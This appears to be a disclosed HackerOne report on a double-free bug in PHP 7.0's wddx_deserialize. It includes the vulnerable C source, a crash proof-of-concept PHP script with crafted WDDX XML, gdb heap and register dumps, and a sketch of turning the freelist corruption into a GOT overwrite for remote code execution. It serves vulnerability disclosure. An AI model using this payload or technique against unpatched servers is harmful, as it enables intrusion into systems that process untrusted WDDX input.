# Double Free Corruption in wddx.c (extension)

## Report Details
- **Report ID**: 146255
- **URL**: https://hackerone.com/reports/146255
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-06-21T15:52:28.912Z
- **Disclosed**: 2019-11-12T09:35:00.257Z

## Reporter
- **Username**: hoangnguyen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
There are a bug double free occur in wddx_deserialize, which trying to deserialize malicious xml input from user's request.

The problem start here in :
```
static void php_wddx_push_element(void *user_data, const XML_Char *name, const XML_Char **atts)
{
           ...snip.....
	} else if (!strcmp((char *)name, EL_BOOLEAN)) {
		int i;

		if (atts) for (i = 0; atts[i]; i++) {
			if (!strcmp((char *)atts[i], EL_VALUE) && atts[++i] && atts[i][0]) {
				ent.type = ST_BOOLEAN;
				SET_STACK_VARNAME;

				ZVAL_TRUE(&ent.data);
				wddx_stack_push((wddx_stack *)stack, &ent, sizeof(st_entry));
				php_wddx_process_data(user_data, atts[i], strlen((char *)atts[i]));
				break;
			}
		}
	}
}
```
When wddx_deserialize a tag <boolean value="true/false"> they get content of value and then pass to  php_wddx_process_data(user_data, atts[i], strlen((char *)atts[i])); directly.

```
static void php_wddx_process_data(void *user_data, const XML_Char *s, int len)
{
           ...snip.....
          wddx_stack_top(stack, (void**)&ent); //return element in top of the stack
           switch (ent->type) {
			case ST_BOOLEAN:
				if (!strcmp((char *)s, "true")) {
					Z_LVAL(ent->data) = 1;
				} else if (!strcmp((char *)s, "false")) {
					Z_LVAL(ent->data) = 0;
				} else {
					zval_ptr_dtor(&ent->data);
					if (ent->varname) {
						efree(ent->varname);
					}
					ZVAL_UNDEF(&ent->data);
				}
				break;
        ...snip....
}
```
In php_wddx_process_data they just compare value data with "true" or "false" and set 0/1 to ent->data. The  problem is if value is not true/false then they call **efree(ent->varname) ** .
After that, php_wddx_process_data back to php_wddx_push_element to continute execution. If i add some string in <boolean> (ex: <boolean value="none">AAAAA</boolean> ), php_wddx_process_data will call again (after php_wddx_push_element had ended) and wddx_stack_top will return the same ent in the last called  php_wddx_process_data and because s in this second call point to own xml string and ent->type still is boolean so efree(ent->varname) will hit again, and this leads to double free.

### Crash Poc (Ubuntu 16.04 x86_64,PHP 7.0.4 (cli))
test.php
```
<?php
$xml = <<<EOF
<?xml version='1.0' ?>
<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>
<wddxPacket version='1.0'>
	<array>
		<var name="XXXXXXXX">
			<boolean value="none">AAAAAAA</boolean>
		</var>
		<var name="YYYYYYYY">
			<var name="ZZZZZZZZ">
				<var name="EZEZEZEZ">
				</var>
			</var>
		</var>
	</array>
</wddxPacket>
EOF;
$array = wddx_deserialize($xml);

// echo var_dump($array);

foreach($array as $key => $value){
	echo "{$key} : {$value}\n";
}
// php
?>
```

And we got :
```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x5959595959595959 ('YYYYYYYY')
RBX: 0x5
RCX: 0x14
RDX: 0x9 ('\t')
RSI: 0x30 ('0')
RDI: 0x7ffff4400040 --> 0x0
RBP: 0x7fffffffab20 --> 0x7fffffffab90 --> 0x7fffffffabc0 --> 0x7fffffffac00 --> 0x7fffffffad20 --> 0x7fffffffada0 --> 0x121b780 --> 0x1217fe0 --> 0x0
RSP: 0x7fffffffaad0 --> 0x7ffff4471100 --> 0x9 ('\t')
RIP: 0x8536b1 (<zend_mm_alloc_small+176>:	mov    rdx,QWORD PTR [rax])
R8 : 0x313
R9 : 0x0
R10: 0x5
R11: 0x1
R12: 0x121cd34 --> 0x6f6f6200656d616e ('name')
R13: 0x121985b ("name=\"UUUUUUUU\">\n\t\t\t\t</var>\n\t\t\t</var>\n\t\t</var>\n\t</array>\n</wddxPacket>")
R14: 0x1
R15: 0x121d150 --> 0x121cd34 --> 0x6f6f6200656d616e ('name')
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8536a5 <zend_mm_alloc_small+164>:	mov    rax,QWORD PTR [rax+rdx*8]
   0x8536a9 <zend_mm_alloc_small+168>:	mov    QWORD PTR [rbp-0x8],rax
   0x8536ad <zend_mm_alloc_small+172>:	mov    rax,QWORD PTR [rbp-0x8]
=> 0x8536b1 <zend_mm_alloc_small+176>:	mov    rdx,QWORD PTR [rax]
   0x8536b4 <zend_mm_alloc_small+179>:	mov    rax,QWORD PTR [rbp-0x28]
   0x8536b8 <zend_mm_alloc_small+183>:	mov    ecx,DWORD PTR [rbp-0x34]
   0x8536bb <zend_mm_alloc_small+186>:	movsxd rcx,ecx
   0x8536be <zend_mm_alloc_small+189>:	add    rcx,0x4
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffaad0 --> 0x7ffff4471100 --> 0x9 ('\t')
0008| 0x7fffffffaad8 --> 0x0
0016| 0x7fffffffaae0 --> 0xd91858 ("/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c")
0024| 0x7fffffffaae8 --> 0x500000313
0032| 0x7fffffffaaf0 --> 0x30 ('0')
0040| 0x7fffffffaaf8 --> 0x7ffff4400040 --> 0x0
0048| 0x7fffffffab00 --> 0x7ffff44710f0 ("ZZZZZZZZ")
0056| 0x7fffffffab08 --> 0x59688
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000008536b1 in zend_mm_alloc_small (heap=0x7ffff4400040, size=0x30, bin_num=0x5,
    __zend_filename=0xd91858 "/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c",
    __zend_lineno=0x313, __zend_orig_filename=0x0, __zend_orig_lineno=0x0)
    at /home/vagrant/Sources_Ext/php7.0-7.0.4/Zend/zend_alloc.c:1291
1291			heap->free_slot[bin_num] = p->next_free_slot;
```
### Analysis in deep 

When free(XXXXXXXX)  zend_mm_alloc_small will update linked list for each size request and store the last freed chunk into heap->free_slot. Because free(XXXXXXXX) was freed 2 times then this next pointer will point to itself.

After 1st efree(ent->varname).
```
[-------------------------------------code-------------------------------------]
   0x7c6f0b <php_wddx_process_data+606>:
    lea    rsi,[rip+0x5ca946]        # 0xd91858
   0x7c6f12 <php_wddx_process_data+613>:  mov    rdi,rax
   0x7c6f15 <php_wddx_process_data+616>:  call   0x85637d <_efree>
=> 0x7c6f1a <php_wddx_process_data+621>:  mov    rax,QWORD PTR [rbp-0x60]
   0x7c6f1e <php_wddx_process_data+625>:  mov    DWORD PTR [rax+0x8],0x0
   0x7c6f25 <php_wddx_process_data+632>:
    jmp    0x7c7005 <php_wddx_process_data+856>
   0x7c6f2a <php_wddx_process_data+637>:  mov    eax,DWORD PTR [rbp-0x74]
   0x7c6f2d <php_wddx_process_data+640>:  add    eax,0x1
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffab80 --> 0x7ffff4402a40 --> 0x121d150 --> 0x121cd41 --> 0x65756c6176 ('value')
0008| 0x7fffffffab88 --> 0x4f4402a60
0016| 0x7fffffffab90 --> 0x12046b0 --> 0x74696873 ('shit')
0024| 0x7fffffffab98 --> 0x7fffffffb060 --> 0x1000000002
0032| 0x7fffffffaba0 --> 0x7ffff4402a40 --> 0x121d150 --> 0x121cd41 --> 0x65756c6176 ('value')
0040| 0x7fffffffaba8 --> 0x7fffffffb060 --> 0x1000000002
0048| 0x7fffffffabb0 --> 0xd91858 ("/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c")
0056| 0x7fffffffabb8 --> 0x20 (' ')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
1023            ZVAL_UNDEF(&ent->data);
gdb-peda$ x/gx 0x7ffff44710c0
0x7ffff44710c0: 0x00007ffff4471090
```

After the second efree(ent->varname)

```
[-------------------------------------code-------------------------------------]
   0x7c6f0b <php_wddx_process_data+606>:
    lea    rsi,[rip+0x5ca946]        # 0xd91858
   0x7c6f12 <php_wddx_process_data+613>:  mov    rdi,rax
   0x7c6f15 <php_wddx_process_data+616>:  call   0x85637d <_efree>
=> 0x7c6f1a <php_wddx_process_data+621>:  mov    rax,QWORD PTR [rbp-0x60]
   0x7c6f1e <php_wddx_process_data+625>:  mov    DWORD PTR [rax+0x8],0x0
   0x7c6f25 <php_wddx_process_data+632>:
    jmp    0x7c7005 <php_wddx_process_data+856>
   0x7c6f2a <php_wddx_process_data+637>:  mov    eax,DWORD PTR [rbp-0x74]
   0x7c6f2d <php_wddx_process_data+640>:  add    eax,0x1
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffad00 --> 0x7
0008| 0x7fffffffad08 --> 0x400000005
0016| 0x7fffffffad10 --> 0x1219809 ("\n\t\t\t</boolean>\n\t\t</var>\n\t\t<var name=\"YYYYYYYY\">\n\t\t\t<var name=\"ZZZZZZZZ\">\n\t\t\t\t<var name=\"EZEZEZEZ\">\n\t\t\t\t</var>\n\t\t\t</var>\n\t\t</var>\n\t</array>\n</wddxPacket>")
0024| 0x7fffffffad18 --> 0x7fffffffb060 --> 0x1000000002
0032| 0x7fffffffad20 --> 0x7ffff4402a40 --> 0x121d150 --> 0x121cd41 --> 0x65756c6176 ('value')
0040| 0x7fffffffad28 --> 0x7fffffffb060 --> 0x1000000002
0048| 0x7fffffffad30 --> 0x121d168 --> 0x0
0056| 0x7fffffffad38 --> 0x121cd41 --> 0x65756c6176 ('value')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
1023            ZVAL_UNDEF(&ent->data);
gdb-peda$ x/gx 0x7ffff44710c0
0x7ffff44710c0: 0x00007ffff44710c0
```
we got a chunk that point to itself, because zend_mm_alloc_small() will update heap->free_slot[bin_num] = p->next_free_slot.

If we try to malloc with the same size of ent->varname (was freed) at 0x7ffff44710c0 :

1st malloc : YYYYYYYY , zend_mm_alloc_small() will return with 0x7ffff44710c0 and update heap->free_slot[bin_num] = p->next_free_slot = 0x7ffff44710c0 (because 0x7ffff44710c0 point to itself as above).

```
[----------------------------------registers-----------------------------------]
RAX: 0x7ffff44710c0 ("YYYYYYYY")
RBX: 0x5
RCX: 0x12
RDX: 0x9 ('\t')
RSI: 0x12046b0 ("YYYYYYYY")
RDI: 0x7ffff44710c0 ("YYYYYYYY")
RBP: 0x7fffffffad20 --> 0x7fffffffada0 --> 0x121b780 --> 0x1217fe0 --> 0x0
RSP: 0x7fffffffac10 --> 0x7ffff4402a40 --> 0x7ffff44029c0 --> 0x7ffff4402980 --> 0x7ffff4402940 --> 0x7ffff44028c0 --> 0x7ffff4402bc0 --> 0x7ffff4402c00 --> 0x7ffff4402c40 --> 0x7ffff4402c80 --> 0x7ffff4402cc0 --> 0x7ffff4402d00 --> 0x7ffff4402d40 --> 0x7ffff4402d80 --> 0x7ffff4402dc0 --> 0x7ffff4402e00 --> 0x7ffff4402e40 --> 0x7ffff4402e80 --> 0x7ffff4402ec0 --> 0x7ffff4402f00 --> 0x7ffff4402f40 --> 0x7ffff4402f80 --> 0x7ffff4402fc0 --> 0x0
RIP: 0x7c5ce1 (<php_wddx_push_element+2802>:  mov    rdx,rax)
R8 : 0x313
R9 : 0x0
R10: 0x5
R11: 0x1
R12: 0x121cd34 --> 0x6f6f6200656d616e ('name')
R13: 0x1219828 ("name=\"YYYYYYYY\">\n\t\t\t<var name=\"ZZZZZZZZ\">\n\t\t\t\t<var name=\"EZEZEZEZ\">\n\t\t\t\t</var>\n\t\t\t</var>\n\t\t</var>\n\t</array>\n</wddxPacket>")
R14: 0x1
R15: 0x121d150 --> 0x121cd34 --> 0x6f6f6200656d616e ('name')
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7c5cd2 <php_wddx_push_element+2787>:
    lea    rsi,[rip+0x5cbb7f]        # 0xd91858
   0x7c5cd9 <php_wddx_push_element+2794>: mov    rdi,rax
   0x7c5cdc <php_wddx_push_element+2797>: call   0x856850 <_estrdup>
=> 0x7c5ce1 <php_wddx_push_element+2802>: mov    rdx,rax
   0x7c5ce4 <php_wddx_push_element+2805>: mov    rax,QWORD PTR [rbp-0xc0]
   0x7c5ceb <php_wddx_push_element+2812>: mov    QWORD PTR [rax+0x8],rdx
   0x7c5cef <php_wddx_push_element+2816>:
    jmp    0x7c639c <php_wddx_push_element+4525>
   0x7c5cf4 <php_wddx_push_element+2821>: add    DWORD PTR [rbp-0xd8],0x1
[------------------------------------stack-------------------------------------]
```

2nd malloc : ZZZZZZZZ , zend_mm_alloc_small() will return with 0x7ffff44710c0 again and then update 
heap->free_slot[bin_num] = p->next_free_slot = YYYYYYYY (because zend_mm_alloc_small think YYYYYYYY is the next_free_slot).

3rd malloc:  EZEZEZEZ, zend_mm_alloc_small() will return YYYYYYYY for us and this lead to crash at **heap->free_slot[bin_num] = p->next_free_slot;** when zend_mm_alloc_small() try to update next_free_slot to heap->free_slot.

At this point, if we replace YYYYYYYY with an address of GOT table for example memcpy@got, zend_mm_alloc_small() will happly return this address for us, and the call memcpy(memcpy@got,EZEZEZEZE,8); in which EZEZEZEZ is value we control, this may lead to remote code execution.

This bug also works in PHP 7.0.x

References: https://bugs.php.net/bug.php?id=72340

## Attachments
No attachments
